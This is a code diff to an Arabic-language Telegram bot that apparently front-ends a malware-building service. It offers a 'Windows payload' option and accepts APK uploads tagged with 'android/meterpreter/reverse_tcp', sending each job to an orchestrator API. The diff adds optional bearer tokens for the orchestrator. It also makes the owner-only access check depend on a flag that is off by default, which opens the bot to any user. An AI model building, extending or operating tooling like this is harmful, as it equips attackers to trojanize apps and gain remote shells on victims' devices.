@@ -40,6 +40,10 @@ ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))
 
+# Phase 0 flags
+REQUIRE_OWNER_ID = os.environ.get("REQUIRE_OWNER_ID", "false").lower() == "true"
+ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
+
 # File upload configuration
 MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
 ALLOWED_EXTENSIONS = ['.apk']
@@ -51,6 +55,20 @@ UPLOAD_DIR.mkdir(exist_ok=True)
 TEMP_DIR.mkdir(exist_ok=True)
 
 MENU, PARAMS, UPLOAD_APK, UPLOAD_PARAMS = range(4)
+
+# Concise env check at startup (non-fatal)
+def _env_summary():
+    flags = {
+        "REQUIRE_OWNER_ID": REQUIRE_OWNER_ID,
+        "ORCH_AUTH_TOKEN": bool(ORCH_AUTH_TOKEN),
+    }
+    have_owner = OWNER_ID != 0
+    logger.info("BOT-ENV: owner_set=%s, flags=%s, orch_url=%s", have_owner, flags, ORCH_URL)
+    if REQUIRE_OWNER_ID and not have_owner:
+        logger.error("REQUIRE_OWNER_ID enabled but TELEGRAM_OWNER_ID not set. Exiting.")
+        raise SystemExit(2)
+
+_env_summary()
 
 @dataclass
 class Session:
@@ -242,12 +260,13 @@ class SecureFileManager:
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        if update.message:
-            await update.message.reply_text("تم رفض الوصول.")
-        elif update.callback_query:
-            await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
-        return ConversationHandler.END
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            if update.message:
+                await update.message.reply_text("تم رفض الوصول.")
+            elif update.callback_query:
+                await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
+            return ConversationHandler.END
     
     kb = [
         [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
@@ -277,9 +296,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle uploaded APK files"""
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("تم رفض الوصول.")
-        return ConversationHandler.END
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            await update.message.reply_text("تم رفض الوصول.")
+            return ConversationHandler.END
     
     if not update.message.document:
         await update.message.reply_text("يرجى إرسال ملف APK صحيح.")
@@ -421,8 +441,9 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         "payload": "android/meterpreter/reverse_tcp"
     }
     
-    # Create task via API
-    async with httpx.AsyncClient(timeout=600) as client:
+    # Create task via API with optional Authorization
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
         resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": "upload_apk", "params": sess.params})
         resp.raise_for_status()
         data = resp.json()
@@ -669,7 +690,8 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     # create task
-    async with httpx.AsyncClient(timeout=600) as client:
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
         resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
         resp.raise_for_status()
         data = resp.json()
@@ -682,7 +704,8 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
     chat_id = update.effective_chat.id
-    async with httpx.AsyncClient(timeout=600) as client:
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
         for _ in range(60):
             r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
             r.raise_for_status()
@@ -712,14 +735,16 @@ async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("تم رفض الوصول.")
-        return
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            await update.message.reply_text("تم رفض الوصول.")
+            return
     if not context.args:
         await update.message.reply_text("الاستخدام: /cancel <task_id>")
         return
     task_id = context.args[0]
-    async with httpx.AsyncClient(timeout=30) as client:
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=30, headers=headers) as client:
         r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
         if r.status_code == 200:
             await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
@@ -758,8 +783,10 @@ def main():
     logger.info("Starting polling...")
     try:
         application.run_polling(allowed_updates=("message","callback_query"), drop_pending_updates=True)
-    except Exception as e:
-        logger.exception("Bot crashed: %s", e)
+    except SystemExit:
+        raise
+    except Exception:
+        logger.exception("Bot stopped due to an error")
 
 
 if __name__ == "__main__":
